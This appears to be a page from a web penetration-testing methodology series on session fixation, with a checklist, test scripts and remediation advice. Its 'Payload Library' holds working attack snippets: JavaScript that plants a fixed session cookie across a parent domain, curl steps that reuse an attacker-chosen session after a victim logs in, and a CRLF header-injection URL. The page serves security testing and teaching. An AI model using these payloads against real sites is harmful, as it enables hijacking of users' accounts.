---
title: "Session Fixation"
date: 2026-02-24
draft: false
---

# Session Fixation

> **Severity**: High | **CWE**: CWE-384
> **OWASP**: A07:2021 – Identification and Authentication Failures

---

## What Is Session Fixation?

Session fixation occurs when an application does not issue a **new session identifier after successful authentication**. An attacker who can set or predict the victim's pre-authentication session ID can then wait for the victim to log in and immediately reuse that same ID to gain authenticated access.

The classic scenario requires the attacker to be able to push a known session ID to the victim — via URL parameter, cookie injection, or subdomain cookie injection.

```
Session fixation attack flow:
  1. Attacker obtains valid pre-auth session: SESS_ID=ATTACKER_KNOWN
  2. Attacker sends victim: https://target.com/login?SID=ATTACKER_KNOWN
     Or: injects cookie via XSS or subdomain:
         document.cookie = "session=ATTACKER_KNOWN; domain=.target.com"
  3. Victim visits URL, app uses ATTACKER_KNOWN as their session
  4. Victim logs in → if app doesn't regenerate session → SESS_ID=ATTACKER_KNOWN still valid
  5. Attacker uses SESS_ID=ATTACKER_KNOWN → authenticated as victim
```

---

## Discovery Checklist

**Phase 1 — Pre-Auth Session Issuance**
- [ ] Visit the login page without a session cookie — does server issue a pre-auth session?
- [ ] Note the session ID value before login
- [ ] Complete authentication
- [ ] Compare session ID after login — did it change?
- [ ] If same: **session fixation confirmed**

**Phase 2 — Session Injection Vectors**
- [ ] Does app accept session ID from URL parameter? (`?session=X`, `?PHPSESSID=X`, `?sid=X`)
- [ ] Does app set session cookie from URL then redirect? (cookie tossing)
- [ ] Is subdomain cookie injection possible (related domain can set cookies for parent domain)?
- [ ] Is there XSS on any pre-auth page that could inject cookie values?
- [ ] Does app accept session via `Authorization: Bearer` that is user-supplied pre-auth?

**Phase 3 — Cookie Scope Analysis**
- [ ] Check `Domain=` attribute: `.target.com` allows subdomains to overwrite parent cookies
- [ ] Identify any subdomains with XSS or other injection → can write cookies for parent domain
- [ ] Check `Path=` attribute: `/login` path cookies can be fixed to a specific path
- [ ] Test `Set-Cookie` from HTTP response before redirect: can HTTP endpoint set HTTPS cookie?

---

## Payload Library

### Payload 1 — Basic Session Non-Regeneration Test

```python
#!/usr/bin/env python3
"""
Test if session ID is regenerated after authentication
"""
import requests

TARGET = "https://target.com"

s = requests.Session()
s.headers = {"User-Agent": "Mozilla/5.0"}

# Step 1: Visit login page — note pre-auth session:
r = s.get(f"{TARGET}/login")
pre_auth_cookies = dict(s.cookies)
print("[*] Pre-auth session cookies:")
for name, value in pre_auth_cookies.items():
    print(f"  {name}={value[:20]}...")

# Step 2: Login:
r = s.post(f"{TARGET}/api/login",
           json={"username": "youruser@target.com", "password": "YourPassword"},
           headers={"Content-Type": "application/json"})

post_auth_cookies = dict(s.cookies)
print("\n[*] Post-auth session cookies:")
for name, value in post_auth_cookies.items():
    print(f"  {name}={value[:20]}...")

# Step 3: Compare:
session_names = set(pre_auth_cookies.keys()) & set(post_auth_cookies.keys())
for name in session_names:
    if pre_auth_cookies[name] == post_auth_cookies[name]:
        print(f"\n[!!!] SESSION FIXATION: {name} was NOT regenerated after login!")
        print(f"      Value: {pre_auth_cookies[name][:40]}...")
    else:
        print(f"\n[ ] {name} was properly regenerated after login")
        print(f"    Before: {pre_auth_cookies[name][:30]}...")
        print(f"    After:  {post_auth_cookies[name][:30]}...")
```

### Payload 2 — Session Injection via URL Parameter

```bash
# Test if app accepts session ID from URL parameter:
# Many PHP apps: ?PHPSESSID=ATTACKER_CHOSEN_VALUE
# ASP.NET: ?ASP.NET_SessionId=VALUE
# Java: ;jsessionid=VALUE  (URL path parameter)

# Step 1: Craft login URL with known session ID:
TARGET="https://target.com/login"
ATTACKER_SESSION="ATTACKER_CHOSEN_SESSION_ID_12345"

# PHP session via GET parameter:
curl -c /tmp/victim_cookies.txt -b "PHPSESSID=$ATTACKER_SESSION" \
  "$TARGET"

# Then victim logs in via:
curl -c /tmp/victim_cookies.txt -b "PHPSESSID=$ATTACKER_SESSION" \
  -X POST "https://target.com/login" \
  -d "username=victim&password=victimpass"

# Check if session is still valid for attacker after victim login:
curl -b "PHPSESSID=$ATTACKER_SESSION" "https://target.com/dashboard" | \
  grep -i "victim\|logged in\|welcome"

# Java JSESSIONID via URL matrix parameter (;jsessionid=):
# Send victim link: https://target.com/login;jsessionid=FIXED_SESSION_ID
FIXED_ID="FIXEDSESSIONID1234567890ABCDEF01"
curl -v "https://target.com/login;jsessionid=$FIXED_ID"

# ASP.NET session fixation via cookie:
curl -b "ASP.NET_SessionId=ATTACKER_SESSION_12345" \
  "https://target.com/login"

# After victim authenticates (using the fixed session):
curl -b "ASP.NET_SessionId=ATTACKER_SESSION_12345" \
  "https://target.com/Account/Dashboard"
```

### Payload 3 — Cookie Injection via Subdomain

```html
<!--
Prerequisite:
  - control a subdomain: sub.target.com (e.g., via subdomain takeover, XSS on sub)
  - target.com session cookie has Domain=.target.com (note leading dot)

From sub.target.com:
-->
<script>
// Inject session cookie for parent domain:
document.cookie = "session=ATTACKER_KNOWN_SESSION; domain=.target.com; path=/";

// Or: PHP session:
document.cookie = "PHPSESSID=ATTACKER_KNOWN_SESSION; domain=.target.com; path=/";

// Wait for victim to login at target.com/login (they'll have the fixed session)
// Then use ATTACKER_KNOWN_SESSION at target.com/dashboard

// Automated: redirect victim to login after fixing session:
setTimeout(function() {
    window.location = "https://target.com/login?utm_source=promo";
}, 500);
</script>

<!--
Cookie tossing: if app accepts session from login URL:
Send victim: https://target.com/login?redirect=https://attacker.com/track
             where attacker.com serves a redirect back with session injection

Or: via CRLF injection in redirect parameter (if unfiltered):
https://target.com/login?redirect=https://target.com%0d%0aSet-Cookie:session=FIXED

Note: browsers ignore Set-Cookie in JS-triggered fetches, but
      server-side redirects via 302 with injected headers work
-->
```

### Payload 4 — HTTP → HTTPS Cookie Injection

```bash
# If target.com has HTTP endpoint (even just for redirect):
# HTTP response can set cookies that apply to HTTPS site
# (unless cookies have Secure flag — but many legacy apps don't)

# Check if HTTP endpoint exists:
curl -v "http://target.com/login" 2>&1 | grep -i "set-cookie\|location"

# If HTTP is redirected but without HSTS:
# Attacker on MITM position can intercept HTTP request and inject:
# HTTP/1.1 302 Found
# Location: https://target.com/login
# Set-Cookie: session=ATTACKER_KNOWN; domain=target.com; path=/

# Test: does app set session cookie on HTTP before redirect to HTTPS?
curl -v "http://target.com/" 2>&1 | grep -i "set-cookie"

# If yes → victim's first HTTP request gets attacker's cookie before HTTPS redirect

# Test cookie overwriting via HTTP (if site has HTTPS but no HSTS preload):
# Python MitM test (local only, test against your own setup):
python3 << 'EOF'
import subprocess, socket

# Check if Secure flag is set on session cookie:
import requests
r = requests.get("https://target.com/login", allow_redirects=False)
for cookie in r.cookies:
    print(f"Cookie: {cookie.name}, Secure: {cookie.secure}, HttpOnly: {cookie.has_nonstandard_attr('httponly')}")
    if not cookie.secure:
        print(f"  [!!!] {cookie.name} missing Secure flag → injectable via HTTP!")
EOF
```

### Payload 5 — Post-Password-Change Session Invalidation

```python
#!/usr/bin/env python3
"""
Test if changing password invalidates all other sessions
Related to session fixation: if sessions aren't cleared on password change,
stolen session remains valid indefinitely
"""
import requests

TARGET = "https://target.com"
VICTIM_EMAIL = "victim@target.com"
VICTIM_PASS = "OriginalPassword1!"
NEW_PASS = "NewPassword2024!"

# Simulate attacker who stole a session cookie:
# (In practice: obtained via fixation, XSS, or other means)

# Step 1: Legitimate login (victim) → get session A:
s_victim = requests.Session()
s_victim.post(f"{TARGET}/api/login",
              json={"username": VICTIM_EMAIL, "password": VICTIM_PASS})
session_a = s_victim.cookies.get("session", s_victim.cookies.get("PHPSESSID", ""))
print(f"[*] Stolen session A: {session_a[:30]}...")

# Step 2: Victim changes password (in another session/browser):
s_new = requests.Session()
s_new.post(f"{TARGET}/api/login",
           json={"username": VICTIM_EMAIL, "password": VICTIM_PASS})
s_new.post(f"{TARGET}/api/account/change-password",
           json={"old_password": VICTIM_PASS, "new_password": NEW_PASS})
print(f"[*] Victim changed password to: {NEW_PASS}")

# Step 3: Test if old session A is still valid (it shouldn't be):
s_attacker = requests.Session()
s_attacker.cookies.set("session", session_a)
r = s_attacker.get(f"{TARGET}/api/profile")
if r.status_code == 200 and "error" not in r.text.lower():
    print(f"[!!!] OLD SESSION STILL VALID after password change!")
    print(f"      Response: {r.text[:200]}")
else:
    print(f"[ ] Session properly invalidated: {r.status_code}")

# Also test: does logout only invalidate current session or ALL sessions?
```

### Payload 6 — Token-Based Session Fixation (JWT/OAuth)

```bash
# Some token-based systems have fixation-equivalent issues:

# 1. OAuth authorization_code → fixed token exchange:
# If attacker can intercept and replay authorization_code before victim:
# → attacker gets access token for victim's account

# 2. Password reset token + session fixation:
# Step 1: Request password reset for victim → reset token sent to victim email
# Step 2: Victim clicks reset link → new session created
# If new session reuses pre-reset session ID → fixation via reset flow:
curl -b "session=ATTACKER_KNOWN" "https://target.com/reset/TOKEN_FROM_EMAIL"

# 3. "Remember me" token as session fixation vector:
# If remember-me token is predictable or injectable:
curl -b "remember_me=ATTACKER_PREDICTED_TOKEN" "https://target.com/login"

# 4. Test if pre-auth session persists through:
python3 << 'EOF'
import requests

base = "https://target.com"
s = requests.Session()

# Inject known session cookie manually:
s.cookies.set("session", "KNOWN_FIXATION_VALUE", domain="target.com")

# Visit login page:
r = s.get(f"{base}/login")
print("Pre-auth cookie preserved:", s.cookies.get("session") == "KNOWN_FIXATION_VALUE")

# Authenticate:
r = s.post(f"{base}/api/login", json={"username":"YOUR_USER","password":"YOUR_PASS"})

# Check if fixed session is still being used:
if s.cookies.get("session") == "KNOWN_FIXATION_VALUE":
    print("[!!!] SESSION FIXATION: app accepted and maintained injected session!")
else:
    print("[ ] Session was regenerated:", s.cookies.get("session", "?")[:30])
EOF
```

---

## Tools

```bash
# Manual session fixation test via Burp Suite:
# 1. Open Proxy → Intercept login request
# 2. Before login: note session cookie value (from Cookie header)
# 3. Complete login
# 4. Check response: does Set-Cookie issue a NEW session ID?
# 5. If same value in Set-Cookie → CONFIRMED

# Burp Suite — session management rules:
# Project Options → Sessions → Rules
# Add rule to compare pre/post-auth session IDs automatically

# BChecks (Burp Pro) — custom session fixation check:
# Can write a BCheck that:
# 1. Issues pre-auth GET to login page
# 2. Extracts session cookie
# 3. POSTs login credentials
# 4. Checks if session cookie changed in response

# curl-based test:
# Pre-auth:
PRE=$(curl -si "https://target.com/login" | grep -i 'set-cookie.*session' | \
  grep -oP 'session=[^;]+')
echo "Pre-auth: $PRE"

# Login:
POST_RESP=$(curl -si -X POST "https://target.com/login" \
  -b "$(echo $PRE | cut -d= -f2)" \
  -d "username=user@target.com&password=password")

# Post-auth:
POST=$(echo "$POST_RESP" | grep -i 'set-cookie.*session' | \
  grep -oP 'session=[^;]+')
echo "Post-auth: $POST"

[ "$PRE" = "$POST" ] && echo "[!!!] SESSION FIXATION CONFIRMED" || echo "[ ] Sessions differ — likely safe"

# Check cookie security attributes:
curl -si "https://target.com/login" | grep -i "set-cookie" | \
  python3 -c "
import sys
for line in sys.stdin:
    if 'set-cookie' in line.lower():
        print('Cookie:', line.strip())
        print('  Secure:', 'secure' in line.lower())
        print('  HttpOnly:', 'httponly' in line.lower())
        print('  SameSite:', 'samesite' in line.lower())
        print('  Domain:', 'domain=' in line.lower())
"
```

---

## Remediation Reference

- **Regenerate session on login**: immediately after successful authentication, invalidate the old session and issue a new session ID — this is the primary fix
- **Regenerate on privilege change**: also regenerate session when role/privilege changes (e.g., after admin elevation, password change)
- **Invalidate all sessions on password change**: when a user changes their password, all active sessions should be revoked
- **Reject externally-provided session IDs**: never accept session ID from URL parameters or request body — only from cookies; reject if the cookie was not originally set by the server
- **Secure, HttpOnly, SameSite cookies**: `Secure` prevents HTTP injection; `HttpOnly` prevents JS access; `SameSite=Lax` prevents CSRF-based fixation
- **Short session lifetime**: limit pre-authentication session lifetime — don't keep pre-auth sessions alive for more than 10–30 minutes
- **Subdomain isolation**: use `__Host-` cookie prefix to prevent subdomains from overwriting parent domain cookies; or ensure all subdomains are equally trusted

*Part of the Web Application Penetration Testing Methodology series.*
